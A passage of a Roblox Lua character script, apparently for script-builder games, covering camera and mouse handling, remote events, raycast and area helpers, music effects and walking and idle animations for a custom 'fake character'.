table.insert(connections, uis.InputEnded:Connect(function(io, gpe)
	if(gpe)then
		return
	end
	if(Remote)then
		Remote:FireServer(""Mouse"", {
			Key = string.lower(io.KeyCode.Name),
			Hit = mouse.Hit,
			Target = mouse.Target,
			Up = true
		})
	end
end))

table.insert(connections, game:GetService(""UserInputService""):GetPropertyChangedSignal(""MouseBehavior""):Connect(function()
	local MouseBehavior = game:GetService(""UserInputService"").MouseBehavior.Value
	if CameraZoom == 0 then
		game:GetService(""UserInputService"").MouseBehavior = 1
	elseif game:GetService(""UserInputService""):IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
		game:GetService(""UserInputService"").MouseBehavior = 2
	elseif uis:IsKeyDown(Enum.KeyCode.LeftShift)then
		game:GetService(""UserInputService"").MouseBehavior = 1
	else
		if(not shiftlocked)then
			game:GetService(""UserInputService"").MouseBehavior = 0
		else
			game:GetService(""UserInputService"").MouseBehavior = 1
		end
	end
end))

table.insert(connections, game:GetService(""UserInputService""):GetPropertyChangedSignal(""MouseDeltaSensitivity""):Connect(function()
	if game:GetService(""UserInputService"").MouseDeltaSensitivity ~= 1 then
		game:GetService(""UserInputService"").MouseDeltaSensitivity = 1
	end
end))

table.insert(connections, game:GetService(""UserInputService"").InputChanged:Connect(function(Input,Ignore)
	if Input.UserInputType == Enum.UserInputType.MouseWheel then
		if Ignore then
			return
		end 
		if Input.Position.Z > 0 then
			if CameraZoom > 1 then
				CameraZoom = CameraZoom*.8
			else
				CameraZoom = 0
			end
		else
			if CameraZoom >= 1 then
				CameraZoom = CameraZoom*1.25
			else
				CameraZoom = 1
			end
		end
	end
end))

function ClientFuncs(type, tbl)
	if(type == ""End"")then
		scriptStopped = true
		for i,v in next, connections do
			pcall(function()
				v:Disconnect()
			end)
		end
		for i,v in next, changedconnections do
			pcall(function()
				v:Disconnect()
			end)
		end
		workspace.CurrentCamera:Destroy()
		game:GetService(""UserInputService"").MouseBehavior = Enum.MouseBehavior.Default
	end
end

function CanQueryChangedConnect(obj)
	pcall(function()
		obj.CanQuery = true
		obj.CanTouch = true
		obj.CanCollide = true
	end)
	changedconnections[obj] = obj.Changed:Connect(function()
		pcall(function()
			obj.CanQuery = true
			obj.CanTouch = true
			obj.CanCollide = true
		end)
	end)
	table.insert(objectsforcanquery, obj)
end

for i,v in next, workspace:GetDescendants() do
	if(v:IsA(""BasePart""))then
		CanQueryChangedConnect(v)
	end
end

table.insert(connections, workspace.DescendantAdded:Connect(function(v)
	if(v:IsA(""BasePart""))then
		CanQueryChangedConnect(v)
	end
end))

function Raycast(Start, End, Distance, Ignore, WorldModels)
	local Hit,Pos,Mag,Table = nil, nil, 0, {}
	local B,V = workspace:FindPartOnRayWithIgnoreList(Ray.new(Start,((CFrame.new(Start,End).lookVector).unit) * Distance),(Ignore or {}))
	if B ~= nil then
		local BO = (Start - V).Magnitude
		table.insert(Table, {Hit = B, Pos = V, Mag = BO})
	end
	for i,g in next, WorldModels do
		local N,M = g:FindPartOnRayWithIgnoreList(Ray.new(Start,((CFrame.new(Start,End).lookVector).unit) * Distance),(Ignore or {}))
		if N ~= nil then
			local BO = (Start - M).Magnitude
			table.insert(Table, {Hit = N, Pos = M, Mag = BO})
		end
	end
	for i,g in next, Table do
		if i == 1 then
			Mag = Table[i].Mag
		end
		if Table[i].Mag <= Mag then
			Mag = Table[i].Mag
			Hit = Table[i].Hit
			Pos = Table[i].Pos
		end
	end
	return Hit,Pos
end

function IsPointInVolume(point, volumeCenter, volumeSize)
	local volumeSpacePoint = volumeCenter:PointToObjectSpace(point)
	return volumeSpacePoint.X >= -volumeSize.X/2
		and volumeSpacePoint.X <= volumeSize.X/2
		and volumeSpacePoint.Y >= -volumeSize.Y/2
		and volumeSpacePoint.Y <= volumeSize.Y/2
		and volumeSpacePoint.Z >= -volumeSize.Z/2
		and volumeSpacePoint.Z <= volumeSize.Z/2
end

function GetClosestPoint(part, vector)
	local closestPoint = part.CFrame:PointToObjectSpace(vector)
	local size = part.Size / 2
	closestPoint = Vector3.new(
		math.clamp(closestPoint.x, -size.x, size.x),
		math.clamp(closestPoint.y, -size.y, size.y),
		math.clamp(closestPoint.z, -size.z, size.z)
	)
	return part.CFrame:PointToWorldSpace(closestPoint)
end

function Aoe(Position, Range)
	local Descendants = workspace:GetDescendants()
	local parts = {}
	for i = 1, #Descendants do
		local Object = Descendants[i]
		if Object ~= workspace and not Object:IsA(""Terrain"") and Object:IsA(""BasePart"") then
			local ClosestPoint = GetClosestPoint(Object, (typeof(Position) == ""CFrame"" and Position.Position or Position))
			local Magnitude = (Object.Position - (typeof(Position) == ""CFrame"" and Position.Position or Position)).Magnitude
			if IsPointInVolume(ClosestPoint, (typeof(Position) == ""Vector3"" and CFrame.new(Position.X,Position.Y,Position.Z) or Position), (typeof(Range) ~= ""Vector3"" and Vector3.new(Range,Range,Range) or Range)) then
				table.insert(parts, Object)
			end
		end
	end
	return parts
end

function OnClientInvoke(type, tbl)
	if(type == ""Raycast"")then
		return Raycast(tbl[1],tbl[2],tbl[3],tbl[4],tbl[5])
	elseif(type == ""Aoe"")then
		return Aoe(tbl[1], tbl[2])
	end
end

function RandomString(length)
	local a = """"
	for i = 1, length or 20 do
		a = a .. string.char(math.random(1,120))
	end
	return a
end

function lerp(val1, val2, delta)
	return val1 + delta * (val2 - val1)
end

local clientfuncsconn = nil
if(Remote)then
	pcall(function()
		clientfuncsconn:Disconnect()
	end)
	clientfuncsconn = Remote.OnClientEvent:Connect(ClientFuncs)
end
local ConsecutiveFrames = 0
local Throttle = 0
local CameraOffset = CFrame.new(0,0,0)

local ui = nil
local vis = nil
local visframe = nil
local visframes = {}
local mus = nil

table.insert(connections, game:GetService('RunService').RenderStepped:Connect(function(Frames)
	ConsecutiveFrames = ConsecutiveFrames + Frames
	Throttle = 0
	for _ = 1, ConsecutiveFrames/(1/60) do
		ConsecutiveFrames = ConsecutiveFrames - 1/60
		Throttle = Throttle + 1
	end
	if not workspace.CurrentCamera or workspace.CurrentCamera.CameraType ~= Enum.CameraType.Scriptable then
		local lastSubject =  workspace.CurrentCamera.CameraSubject
		game:GetService(""Debris""):AddItem(workspace.CurrentCamera,0)
		local Camera, Removed = Instance.new(""Camera"")
		Camera.Name = RandomString()
		Removed = Camera.AncestryChanged:Connect(function()
			if Camera.Parent ~= workspace then
				game:GetService(""Debris""):AddItem(Camera,0)
				Removed:Disconnect()
			end
		end)
		Camera.Parent = workspace
		workspace.CurrentCamera = Camera
		Camera.CameraSubject = lastSubject
	end
	workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
	local MouseDelta = (game:GetService(""UserInputService""):GetMouseDelta()*(UserSettings():GetService(""UserGameSettings"").MouseSensitivity/2))
	if CameraZoom == 0 then
		game:GetService(""UserInputService"").MouseBehavior = Enum.MouseBehavior.LockCenter
		CameraRotation = CameraRotation - Vector2.new((CameraRotation.Y > 90 or CameraRotation.Y < -90) and -MouseDelta.X or MouseDelta.X,MouseDelta.Y)
	elseif game:GetService(""UserInputService""):IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
		game:GetService(""UserInputService"").MouseBehavior = Enum.MouseBehavior.LockCurrentPosition
		CameraRotation = CameraRotation - Vector2.new((CameraRotation.Y > 90 or CameraRotation.Y < -90) and -MouseDelta.X or MouseDelta.X,MouseDelta.Y)
	else
		if(not shiftlocked)then
			game:GetService(""UserInputService"").MouseBehavior = Enum.MouseBehavior.Default
			CameraOffset = CFrame.new(0,0,0)
		else
			game:GetService(""UserInputService"").MouseBehavior = Enum.MouseBehavior.LockCenter
			CameraRotation = CameraRotation - Vector2.new((CameraRotation.Y > 90 or CameraRotation.Y < -90) and -MouseDelta.X or MouseDelta.X,MouseDelta.Y)
			CameraOffset = CFrame.new(1.5, 0, 0)
		end
	end
	if uis:IsKeyDown(Enum.KeyCode.Left) then
		CameraRotation = CameraRotation + Vector2.new(2.5*Throttle,0)
	end
	if uis:IsKeyDown(Enum.KeyCode.Right) then
		CameraRotation = CameraRotation - Vector2.new(2.5*Throttle,0)
	end
	CameraRotation = Vector2.new(CameraRotation.X > 180 and CameraRotation.X-360 or CameraRotation.X < -180 and CameraRotation.X+360 or CameraRotation.X,math.clamp(CameraRotation.Y,-81,81))
	pcall(function()
		CameraPosition = (workspace.CurrentCamera.CameraSubject ~= nil and workspace.CurrentCamera.CameraSubject.CFrame or CFrame.new(0,0,0)).Position
	end)
	local NewAngles = CFrame.Angles(0,math.rad(CameraRotation.X),0)*CFrame.Angles(math.rad(CameraRotation.Y),0,0)
	CameraCFrame = (NewAngles+CameraPosition+NewAngles*Vector3.new(0,0,lastZoom)):Lerp(NewAngles+CameraPosition+NewAngles*Vector3.new(0,0,CameraZoom), .1)
	workspace.CurrentCamera.CFrame = CameraCFrame*CameraOffset
	workspace.CurrentCamera.Focus = (CameraCFrame*CameraOffset)*CFrame.new(0,0,-CameraZoom)
	Remote = game:GetService('ReplicatedStorage'):FindFirstChild(""__FakeChar""..plr.UserId)
	RemoteFunction = game:GetService('ReplicatedStorage'):FindFirstChild(""__FakeCharRemoteFunction""..plr.UserId)
	mus = (game:GetService(""JointsService""):FindFirstChild(""__FakeCharMusic""..game:GetService('Players').LocalPlayer.UserId) and game:GetService(""JointsService""):FindFirstChild(""__FakeCharMusic""..game:GetService('Players').LocalPlayer.UserId).Value or nil)
	if(not ui or not ui:IsDescendantOf(game:GetService('Players').LocalPlayer:FindFirstChildOfClass(""PlayerGui"")))then
		ui = script.VisGUI:Clone()
		ui.Parent = game:GetService('Players').LocalPlayer:FindFirstChildOfClass(""PlayerGui"")
		vis = ui.Vis
		visframe = script.VisFrame
		visframes = {}
		for i = 1, (vis.AbsoluteSize.X/visframe.AbsoluteSize.X) do
			local v = visframe:Clone()
			v.Parent = vis
			v.Name = i
			visframes[i] = v
		end
	end
	for i,v in next, visframes do
		if(not mus)then
			return
		end
		local noise = math.noise((tick()%1)/(i/(#visframes*math.random(1,2))), mus.PlaybackLoudness%1, 0)*70
		local col = math.clamp(mus.PlaybackLoudness/400*(i/(#visframes*math.random(1,2))), .1, 1)
		game:GetService(""TweenService""):Create(v, TweenInfo.new(.5), {
			Size = UDim2.fromOffset(v.Size.X.Offset, (noise > 0 and noise or -noise)*(mus.PlaybackLoudness/50)),
			BackgroundColor3 = Color3.new(0,0,col),
			BorderColor3 = Color3.new(0,0,col/2)
		}):Play()
	end
	if(Remote)then
		Remote:FireServer(""CameraCFrame"", {
			CFrame = workspace.CurrentCamera.CFrame
		})
		Remote:FireServer(""ShiftLock"", {
			Value = game:GetService(""UserInputService"").MouseBehavior == Enum.MouseBehavior.LockCenter
		})
		Remote:FireServer(""MouseHit"", {
			Value = mouse.Hit
		})
	end
	if(LastRemote ~= Remote and Remote)then
		pcall(function()
			clientfuncsconn:Disconnect()
		end)
		clientfuncsconn = Remote.OnClientEvent:Connect(ClientFuncs)
	end
	if(RemoteFunction)then
		RemoteFunction.OnClientInvoke = OnClientInvoke
	end
	LastRemote = Remote
	for i,v in next, objectsforcanquery do
		if(v:IsDescendantOf(workspace))then
			pcall(function()
				v.CanQuery = true
				v.CanTouch = true
				v.CanCollide = true
			end)
		else
			if(changedconnections[v])then
				pcall(function()
					changedconnections[v]:Disconnect()
				end)
			end
			table.remove(objectsforcanquery, table.find(objectsforcanquery,v))
		end
	end
	lastZoom = lerp(lastZoom, CameraZoom, .2)
end))]], self:GetCurrentPlayer():FindFirstChildOfClass(""PlayerGui""))
	Client.Name = ""__Client""

	for i, v in next, script.ClientStuff:GetChildren() do
		v:Clone().Parent = Client
	end
	
	local function fakeLookat(from, to)
		local cf = CFrame.lookAt(from, to)
		if(cf ~= cf or cf == CFrame.new(math.huge, math.huge, math.huge) or from == to or cf == from)then
			return CFrame.new(from)
		end
		return cf
	end
	
	table.insert(self.Connections, game:GetService(""RunService"").PostSimulation:Connect(function()
		for i,v in next, chatfuncs do
			if(not v:IsDescendantOf(workspace))then
				table.remove(chatfuncs, i)
			end
		end
		
		sin += 1 / self.FpsValue
		if(self:GetCurrentPlayer() and self:GetCurrentPlayer().Character and self:GetCurrentPlayer().Character.Parent)then
			pcall(game.Destroy, self:GetCurrentPlayer().Character)
			self:GetCurrentPlayer().Character = nil
			self:FixCam(campart.self)
		end
		
		if(not self.EffectModel or not self.EffectModel:IsDescendantOf(workspace))then
			pcall(game.Destroy,self.EffectModel)
			self.EffectModel = Instance.new(""WorldModel"", workspace)
			self.EffectModel.Name = self:RandomString(math.random(20,100))
		end
		self.EffectModel.Name = self:RandomString(math.random(20,100))
		headval.self.Value = head.self
		musval.self.Value = mus
		self.Remote = remote.self
		self.RemoteFunction = remotefunction.self
		self.UpdateIgnore()
		if(self.W or self.S or self.A or self.D)then
			self.Walking = true
			if not self.Flying then
				self.CurrentPosition = fakeLookat(self.CurrentPosition.Position, Vector3.new(self.CameraCFrame.X,self.CurrentPosition.Y,self.CameraCFrame.Z))
			else
				self.CurrentPosition = fakeLookat(self.CurrentPosition.Position, Vector3.new(self.CameraCFrame.X,self.CameraCFrame.Y,self.CameraCFrame.Z))
			end
		else
			self.Walking = false
		end
		if self.W then
			self.CurrentPosition = self.CurrentPosition * CFrame.new(0, 0, self.WalkSpeed/(50*self.FpsValue))
		end
		if self.S then
			self.CurrentPosition = self.CurrentPosition * CFrame.new(0, 0, -self.WalkSpeed/(50*self.FpsValue))
		end
		if self.A then
			self.CurrentPosition = self.CurrentPosition * CFrame.new(self.WalkSpeed/(50*self.FpsValue), 0, 0)
		end
		if self.D then
			self.CurrentPosition = self.CurrentPosition * CFrame.new(-self.WalkSpeed/(50*self.FpsValue), 0, 0)
		end
		if(self.CurrentPosition.X ~= self.LastPosition.X or self.CurrentPosition.Z ~= self.LastPosition.Z)and(not self.ShiftLock)then
			if not self.Flying then
				self.CurrentPosition = fakeLookat(self.CurrentPosition.Position, Vector3.new(self.LastPosition.X,self.CurrentPosition.Y,self.LastPosition.Z))
			else
				self.CurrentPosition = fakeLookat(self.CurrentPosition.Position, self.LastPosition.Position)
			end
		end
		if(self.CurrentPosition.Y <= -250)then
			self.Velocity = Vector3.new()
			self.CurrentPosition = CFrame.new(0,5,0)
		end
		self.FakeCurrentPosition = self.FakeCurrentPosition:Lerp(self.CurrentPosition, .1 / self.FpsValue)
		if(not mus or not mus:IsDescendantOf(campart.self))then
			pcall(game.Destroy,mus)
			mus = Instance.new(""Sound"", campart.self)
			mus.SoundId = ""rbxassetid://""..self.Ids[self.SoundIdNum]
			if(not self.Muted)then
				mus.Volume = self.Volume
			else
				mus.Volume = 0
			end
			mus.Pitch = self.Pitch
			mus.TimePosition = self.TimePos
			mus.Looped = true
			mus:Play()
		elseif(mus and mus:IsDescendantOf(campart.self))then
			self.TimePos = mus.TimePosition
			mus.SoundId = ""rbxassetid://""..self.Ids[self.SoundIdNum]
			if(not self.Muted)then
				mus.Volume = self.Volume
			else
				mus.Volume = 0
			end
			mus.Pitch = self.Pitch
			mus.Looped = true
			mus:Resume()
		end
		if(not mus2 or not mus2:IsDescendantOf(campart.self))then
			pcall(game.Destroy,mus2)
			mus2 = Instance.new(""Sound"", campart.self)
			mus2.SoundId = ""rbxassetid://""..mus2id
			mus2.Volume = mus2vol
			mus2.Pitch = mus2pit
			mus2.TimePosition = mus2tp
			mus2.Looped = true
			mus2:Play()
		elseif(mus2 and mus2:IsDescendantOf(campart.self))then
			mus2tp = mus2.TimePosition
			mus2.SoundId = ""rbxassetid://""..mus2id
			mus2.Volume = mus2vol
			mus2.Pitch = mus2pit
			mus2.Looped = true
			mus2:Resume()
		end
		local Velocity = (self.FakeCurrentPosition.Position - self.FakeLastPosition.Position)
		local Direction
		if Velocity.magnitude > 0.01 then
			Direction = (fakeLookat(self.FakeCurrentPosition.Position, self.FakeCurrentPosition.Position+(Velocity)*10)).LookVector
		else
			Direction = Vector3.new(0,0,0)
		end
		if(math.random(1,50*self.FpsValue) == 1)and(not self.AxeEnabled)then
			self:Lightning((rightarm.self.HandCannon.Hole.CFrame*CFrame.new(0,1.5,0)).Position,rightarm.self.HandCannon.Hole.CFrame.Position,5,4,Color3.new(0,0,1),.1)
			self:Effect(rightarm.self.HandCannon.Hole.CFrame, 0, Vector3.new(.3,.3,.3), Color3.new(0,0,1), 2, {
				Transparency = 1,
				Color = Color3.new(),
				Orientation = Vector3.new(math.random(-360,360),math.random(-360,360),math.random(-360,360))
			},{
				Scale = Vector3.new()
			})
		end
		rightarm.self.Attachment.CFrame = CFrame.Angles(0,math.rad((sin)/self.FpsValue),0)*CFrame.new(0,-0.4, -0.7)
		rightarm.self.Attachment2.CFrame = CFrame.Angles(0,math.rad((sin)/self.FpsValue),0)*CFrame.new(0,-0.4, 0.7)
		torso.self.Chain.CurveSize1 = math.cos(sin/20)
		torso.self.Attachment2.CFrame = CFrame.new(1*math.sin(sin/20), .2*math.cos(sin/30), 4+.2*math.cos(sin/40))
		local LookDir = -Direction * self.FakeCurrentPosition.LookVector
		local RightDir = -Direction * self.FakeCurrentPosition.RightVector
		local UpDir = -Direction * self.FakeCurrentPosition.UpVector
		local fnt = (LookDir.X+LookDir.Z+LookDir.Y)
		local lft = (RightDir.X+RightDir.Z+RightDir.Y)
		local top = (UpDir.X+UpDir.Z+UpDir.Y)
		local rlft = math.round(lft)
		local rfnt = math.round(fnt)
		local rtop = math.round(top)
		local th = 0.15
		local lm = -0.7
		local lh = -0.3
		local wsv = 10/math.clamp(self.WalkSpeed/16,.25,2)
		local walkang = -25
		local baseang = -15
		local afnt = math.abs(rfnt)
		local alft = math.abs(rlft)
		local legturn = 20
		local torsoturn = 15
		local am = 0.2
		local ah = 0.1
		local armang = 40
		local armrot = -15
		local walkangle = 5
		c += 1
		b += 1
		d += 1
		a += 1
		e += 1
		self.WeaponCheck()
		if(self.SmokeTime > 0)then
			self.SmokeTime -= 1
			if(d >= d2)and(not self.AxeEnabled)then
				d = 0
				self:Effect(rightarm.self.HandCannon.Hole.CFrame, 0, Vector3.new(math.random(),math.random(),math.random()), Color3.new(0,0,1), 1, {
					Transparency = 1,
					Color = Color3.new(.4,.4,.6),
					Orientation = Vector3.new(math.random(-360,360),math.random(-360,360),math.random(-360,360)),
					Position = rightarm.self.HandCannon.Hole.CFrame.Position+Vector3.new(0,3,0)
				},{
					Scale = Vector3.new(0,0,0)
				})
			end
		end
		if(c >= c2)then
			self.CurrentPosition *= CFrame.new(0, self.Velocity.Y, 0)
		end
		if self.Walking == false and self.Jumping == false and self.Falling == false and self.Attack==false then
			if(not self.AxeEnabled)then
				if(not self.Flying)then
					self.Animate({
						CFrame.new(-0.0529786237, 0, -0.00697433716, 0.965925872, 0, -0.258818835, 0, 1, 0, 0.258818835, 0, 0.965925872)*CFrame.new(0,.1*math.sin(sin/30),0)*CFrame.Angles(math.rad(0), math.rad(0), math.rad(0))*CFrame.Angles(0,math.rad(-180),0),
						CFrame.new(-1.17740369, 5.66244125e-07, 0.431197882, 0.933012664, -0.345915794, 0.0991438255, 0.258818954, 0.836516201, 0.482963145, -0.24999997, -0.42495048, 0.87000984)*CFrame.new(0,.1*math.sin(sin/35),0)*CFrame.Angles(math.rad(-5*math.sin(sin/45)), math.rad(-5*math.sin(sin/42)), math.rad(-5*math.sin(sin/38))),
						CFrame.new(-0.525880694, -2, -0.0965932608, 0.965925813, 0, 0.258819044, 0, 1, 0, -0.258819044, 0, 0.965925813)*CFrame.new(0,-.1*math.sin(sin/30),math.rad(3)*math.cos(sin/30))*CFrame.Angles(math.rad(-3+3*math.cos(sin/30)), math.rad(0), math.rad(0)),
						CFrame.new(1.62323236, -0.0766367614, -0.135728061, 0.748705864, -0.602852523, -0.275696039, 0.377204537, 0.729434371, -0.570650637, 0.545120358, 0.323255748, 0.773530424)*CFrame.new(0,.1*math.sin(sin/32),0)*CFrame.Angles(math.rad(5*math.sin(sin/35)), math.rad(5*math.sin(sin/43)), math.rad(5*math.sin(sin/30))),
						CFrame.new(0.544830382, -2, -0.219067946, 0.866025567, 0, -0.499999583, 0, 1, 0, 0.499999583, 0, 0.866025567)*CFrame.new(0,-.1*math.sin(sin/30),math.rad(3)*math.cos(sin/30))*CFrame.Angles(math.rad(-3+3*math.cos(sin/30)), math.rad(0), math.rad(0)),
						CFrame.new(0.0529785156, 1.5, -0.00697517395, 0.965925872, 0, 0.258818835, 0, 1, 0, -0.258818835, 0, 0.965925872)*CFrame.Angles(math.rad(-3+3*math.cos(sin/31)),math.rad(3*math.cos(sin/35)),math.rad(-3*math.cos(sin/39)))
					}, .1 / self.FpsValue)
				else
					self.Animate({
						CFrame.new(0,0+.5*math.cos((sin-0.5)/28),0)*CFrame.Angles(math.rad(5+5*math.cos(sin/65)),math.rad(2*math.cos(sin/60)),math.rad(2*math.cos(sin/55)))*CFrame.Angles(0,math.rad(-180),0),
						CFrame.new(-1.3,0+.1*math.cos(sin/56),.4)*CFrame.Angles(math.rad(-30+5*math.cos(sin/52)),math.rad(30+5*math.cos(sin/55)),math.rad(20+5*math.cos(sin/54))),
						CFrame.new(-0.5,-2,-.2*math.cos(sin/53))*CFrame.Angles(math.rad(-20+10*math.cos(sin/53)),math.rad(10),math.rad(0)),
						CFrame.new(1.5,0-.1*math.cos(sin/55),.1)*CFrame.Angles(math.rad(-10+5*math.cos(sin/50)),math.rad(-10+5*math.cos(sin/50)),math.rad(5-5*math.cos(sin/52))),
						CFrame.new(0.5,-1.5,-0.3-.2*math.cos(sin/60))*CFrame.Angles(math.rad(-20+10*math.cos(sin/60)),math.rad(-10),math.rad(0)),
						CFrame.new(0,1.5,0)*CFrame.Angles(math.rad(-3+3*math.cos(sin/50)),math.rad(0+1*math.cos(sin/55)),math.rad(0-1*math.cos(sin/53))),
					},.1 / self.FpsValue)
				end
			else
				if(not self.Flying)then
					self.Animate({
						CFrame.new(0, 0, 0, 0.906307697, 0, -0.422618449, 0, 1, 0, 0.422618449, 0, 0.906307697)*CFrame.new(0,-.1*math.cos(sin/30),0)*CFrame.Angles(0,math.rad(-180),0),
						CFrame.new(-1.20559084, -0.122788064, 0.662000775, 0.766044438, -0.368687928, 0.526540756, 0, 0.819151938, 0.57357657, -0.642787635, -0.439385146, 0.627506733)*CFrame.new(0,-.1*math.cos(sin/30),0)*CFrame.Angles(math.rad(5*math.cos(sin/30)),math.rad(5*math.cos(sin/40)),math.rad(5*math.cos(sin/50))),
						CFrame.new(-0.551766336, -2, -0.193184599, 0.965925813, 0, 0.258819103, 0, 1, 0, -0.258819103, 0, 0.965925813)*CFrame.new(0,.1*math.cos(sin/30),0),
						CFrame.new(1.59755099, 0.0619570613, -0.632522881, 0.955168366, -0.145516485, -0.257833987, -0.121584572, 0.601251662, -0.789755404, 0.269945472, 0.785697997, 0.556604028)*CFrame.new(0,-.1*math.cos(sin/30),0)*CFrame.Angles(math.rad(-5*math.cos(sin/35)),math.rad(-5*math.cos(sin/37)),math.rad(-5*math.cos(sin/43))),
						CFrame.new(0.506109416, -2, -0.223524973, 0.906307936, 0, -0.422617853, 0, 1, 0, 0.422617853, 0, 0.906307936)*CFrame.new(0,.1*math.cos(sin/30),0),
						CFrame.new(0, 1.5, 0, 0.906307697, 0, 0.422618449, 0, 1, 0, -0.422618449, 0, 0.906307697)*CFrame.Angles(math.rad(-3+3*math.cos(sin/31)),math.rad(3*math.cos(sin/35)),math.rad(-3*math.cos(sin/39))),
						CFrame.new(-0.478249133, 1.24518871, -0.0847764164, 0.487069905, -0.228174642, -0.843029141, 0.0255902112, 0.968581319, -0.247371614, 0.872986257, 0.0989149883, 0.477606773)*CFrame.Angles(math.rad(2*math.cos(sin/50)),math.rad(2*math.cos(sin/45)),math.rad(2*math.cos(sin/57)))
					}, .1 / self.FpsValue)
				else
					self.Animate({
						CFrame.new(0,0+.5*math.cos((sin-0.5)/28),0)*CFrame.Angles(math.rad(5+5*math.cos(sin/65)),math.rad(2*math.cos(sin/60)),math.rad(2*math.cos(sin/55)))*CFrame.Angles(0,math.rad(-180),0),
						CFrame.new(-1.3,0+.1*math.cos(sin/56),.4)*CFrame.Angles(math.rad(-30+5*math.cos(sin/52)),math.rad(30+5*math.cos(sin/55)),math.rad(20+5*math.cos(sin/54))),
						CFrame.new(-0.5,-2,-.2*math.cos(sin/53))*CFrame.Angles(math.rad(-20+10*math.cos(sin/53)),math.rad(10),math.rad(0)),
						CFrame.new(1.59755099, 0.0619570613, -0.632522881, 0.955168366, -0.145516485, -0.257833987, -0.121584572, 0.601251662, -0.789755404, 0.269945472, 0.785697997, 0.556604028)*CFrame.new(0,-.1*math.cos(sin/30),0)*CFrame.Angles(math.rad(-5*math.cos(sin/35)),math.rad(-5*math.cos(sin/37)),math.rad(-5*math.cos(sin/43))),
						CFrame.new(0.5,-1.5,-0.3-.2*math.cos(sin/60))*CFrame.Angles(math.rad(-20+10*math.cos(sin/60)),math.rad(-10),math.rad(0)),
						CFrame.new(0,1.5,0)*CFrame.Angles(math.rad(-3+3*math.cos(sin/50)),math.rad(0+1*math.cos(sin/55)),math.rad(0-1*math.cos(sin/53))),
						CFrame.new(-0.478249133, 1.24518871, -0.0847764164, 0.487069905, -0.228174642, -0.843029141, 0.0255902112, 0.968581319, -0.247371614, 0.872986257, 0.0989149883, 0.477606773)*CFrame.Angles(math.rad(2*math.cos(sin/50)),math.rad(2*math.cos(sin/45)),math.rad(2*math.cos(sin/57)))
					},.1 / self.FpsValue)
				end
			end
		end
		if(self.Walking == true and self.Jumping == false and self.Falling == false and self.Attack == false)then
			if(not self.Flying)then
				if(not self.AxeEnabled)then
					self.Animate({
						CFrame.new(0,th*math.cos(sin/(wsv/2)),0) * CFrame.Angles(math.rad((walkangle*fnt)*self.WalkSpeed/16),math.rad((torsoturn*lft)*self.WalkSpeed/16),math.rad((walkangle*lft)*self.WalkSpeed/16))*CFrame.Angles(0,math.rad(-180),0),
						CFrame.new(-1.5,(ah*math.sin((sin+1.3)/wsv)),(-am*math.cos((sin+0.5)/wsv))*fnt) * CFrame.Angles(math.rad(((armang*math.cos((sin)/wsv))*fnt)-(walkangle*fnt)),math.rad(((armrot*math.cos((sin+0.25)/wsv))*fnt)),math.rad(((armang/2))*lft)),
						CFrame.new(-0.5-((lm*math.sin((sin+1.35)/wsv))*-lft),-2+th*math.cos(sin/(wsv/2))+lh*math.cos((sin+1.35)/wsv)+(math.rad(-walkangle*(lft+afnt))),-((lm*math.sin((sin+1.35)/wsv))*fnt)-math.rad((torsoturn*lft))) * CFrame.Angles(-math.rad((((-walkang*math.sin((sin)/wsv))*fnt)+(-baseang*afnt))+(-walkangle*fnt)),-math.rad(((legturn)*(fnt*lft))-(torsoturn*lft)),-math.rad((((-walkang*math.sin((sin)/wsv))*lft))+(-walkangle*lft))),
						CFrame.new(1.5,0+1-.1*math.cos(sin/35),0)*CFrame.Angles(math.rad(180+5*math.cos(sin/30)),math.rad(0+5*math.cos(sin/30)),math.rad(5-5*math.cos(sin/32))),
						CFrame.new(0.5-((-lm*math.sin((sin+1.35)/wsv))*-lft),-2+th*math.cos(sin/(wsv/2))-lh*math.cos((sin+1.35)/wsv)+(math.rad(-walkangle*(-lft+afnt))),-((-lm*math.sin((sin+1.35)/wsv))*fnt)+math.rad((torsoturn*lft))) * CFrame.Angles(-math.rad((((walkang*math.sin((sin)/wsv))*fnt)+(-baseang*afnt))+(-walkangle*fnt)),-math.rad(((legturn)*(fnt*lft))-(torsoturn*lft)),-math.rad((((walkang*math.sin((sin)/wsv))*lft))+(-walkangle*lft))),
						CFrame.new(0,1.5,0) * CFrame.Angles(math.rad(((-5*math.cos((sin+0.3)/(wsv/2)))*fnt)+(-walkangle*fnt)),-math.rad((10*lft)),-math.rad((-5*math.cos((sin+0.3)/(wsv/2)))*lft))
					},(.1*self.WalkSpeed/16) / self.FpsValue)
				else
					self.Animate({
						CFrame.new(0,th*math.cos(sin/(wsv/2)),0) * CFrame.Angles(math.rad((walkangle*fnt)*self.WalkSpeed/16),math.rad((torsoturn*lft)*self.WalkSpeed/16),math.rad((walkangle*lft)*self.WalkSpeed/16))*CFrame.Angles(0,math.rad(-180),0),
						CFrame.new(-1.5,(ah*math.sin((sin+1.3)/wsv)),(-am*math.cos((sin+0.5)/wsv))*fnt) * CFrame.Angles(math.rad(((armang*math.cos((sin)/wsv))*fnt)-(walkangle*fnt)),math.rad(((armrot*math.cos((sin+0.25)/wsv))*fnt)),math.rad(((armang/2))*lft)),
						CFrame.new(-0.5-((lm*math.sin((sin+1.35)/wsv))*-lft),-2+th*math.cos(sin/(wsv/2))+lh*math.cos((sin+1.35)/wsv)+(math.rad(-walkangle*(lft+afnt))),-((lm*math.sin((sin+1.35)/wsv))*fnt)-math.rad((torsoturn*lft))) * CFrame.Angles(-math.rad((((-walkang*math.sin((sin)/wsv))*fnt)+(-baseang*afnt))+(-walkangle*fnt)),-math.rad(((legturn)*(fnt*lft))-(torsoturn*lft)),-math.rad((((-walkang*math.sin((sin)/wsv))*lft))+(-walkangle*lft))),
						CFrame.new(1.59755099, 0.0619570613, -0.632522881, 0.955168366, -0.145516485, -0.257833987, -0.121584572, 0.601251662, -0.789755404, 0.269945472, 0.785697997, 0.556604028)*CFrame.new(0,-.1*math.cos(sin/30),0)*CFrame.Angles(math.rad(-5*math.cos(sin/35)),math.rad(-5*math.cos(sin/37)),math.rad(-5*math.cos(sin/43))),
